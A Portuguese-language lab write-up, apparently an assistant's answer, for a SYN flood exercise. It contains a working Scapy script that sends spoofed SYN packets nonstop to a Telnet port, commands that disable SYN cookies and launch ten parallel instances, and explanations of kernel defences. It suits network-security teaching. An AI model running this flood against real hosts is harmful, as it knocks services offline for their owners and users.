Aqui está o conteúdo completo formatado em **Markdown** para você copiar e colocar diretamente no GitHub:

---

# **Tarefa 1 - Ataque SYN Flood com Python**

## **1. Modificações no Código `tarefa1.py`**
```python
#!/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# Configurações do ataque
ip = IP(dst="10.9.0.5")      # IP da vítima (substitua pelo IP correto)
tcp = TCP(dport=23, flags='S') # Porta 23 (Telnet)
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # IP de origem aleatório
    pkt[TCP].sport = getrandbits(16)                # Porta de origem aleatória
    pkt[TCP].seq = getrandbits(32)                  # Número de sequência aleatório
    send(pkt, verbose=0)
```

### **O que o código faz?**
- Gera pacotes TCP SYN falsos com:
  - **IPs de origem aleatórios** (para burlar filtros).
  - **Portas de origem aleatórias**.
  - **Números de sequência aleatórios**.
- Alvo: Servidor Telnet da vítima (`porta 23`).

---

## **2. Passos para Execução do Ataque**

### **Pré-requisitos**
```bash
# Instalar Scapy (Python)
sudo apt update
sudo apt install python3-scapy

# Configurar o kernel (desativar defesas)
sudo sysctl -w net.ipv4.tcp_syncookies=0       # Desliga SYN Cookies
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=80 # Reduz fila SYN
sudo ip tcp_metrics flush                       # Limpa conexões antigas
```

### **Executar o Ataque**
```bash
# Iniciar múltiplas instâncias (aumenta eficácia)
for i in {1..10}; do python3 tarefa1.py & done

# Parar o ataque (kill todos os processos Python)
pkill -f "python3 tarefa1.py"
```

---

## **3. Perguntas e Respostas**

### **1. O ataque funcionou na primeira tentativa?**
**Não**, devido aos mecanismos de proteção do Ubuntu:
- **SYN Cookies** (ativado por padrão) → Desative com `sysctl -w net.ipv4.tcp_syncookies=0`.
- **Fila de conexões prioriza IPs conhecidos** → Limpe com `ip tcp_metrics flush`.
- **Fila SYN muito grande** → Reduza com `sysctl -w net.ipv4.tcp_max_syn_backlog=80`.

### **2. Como o SYN Cookies funciona?**
- **Quando ativado**:
  - O servidor **não armazena** conexões semiabertas (`SYN_RECV`).
  - Envia um **cookie** (hash do IP/porta/seq) no SYN+ACK.
  - Reconstrói a conexão apenas se o cliente responder com o cookie válido.
- **Objetivo**: Mitigar ataques de inundação SYN sem consumir recursos.

### **3. Mecanismo do Ubuntu sem SYN Cookies**
- **25% da fila SYN** é reservada para IPs que já se conectaram antes.
- **Comando para verificar**:
  ```bash
  ip tcp_metrics show  # Lista IPs "conhecidos"
  ip tcp_metrics flush # Limpa a lista
  ```
- **Impacto no ataque**: IPs aleatórios só ocupam **75% da fila**.

---

## **4. Comandos Úteis para Depuração**
| Comando | Descrição |
|---------|-----------|
| `netstat -tna \| grep SYN_RECV \| wc -l` | Conta conexões semiabertas |
| `ss -n state syn-recv sport = 23 \| wc -l` | Conexões SYN_RECV na porta 23 |
| `sysctl net.ipv4.tcp_synack_retries` | Número de retransmissões SYN+ACK |
| `sudo tcpdump -i eth0 'tcp port 23'` | Monitora pacotes Telnet em tempo real |

---

## **5. Referências**
- [RFC 4987 - SYN Flooding Attacks](https://tools.ietf.org/html/rfc4987)
- [Linux Kernel Documentation - TCP SYN Cookies](https://www.kernel.org/doc/html/latest/networking/ip-sysctl.html)

---

**Nota**: Substitua `10.9.0.5` pelo IP real da vítima.  
**Dica**: Use `&` para rodar o script em segundo plano (ex: `python3 tarefa1.py &`).
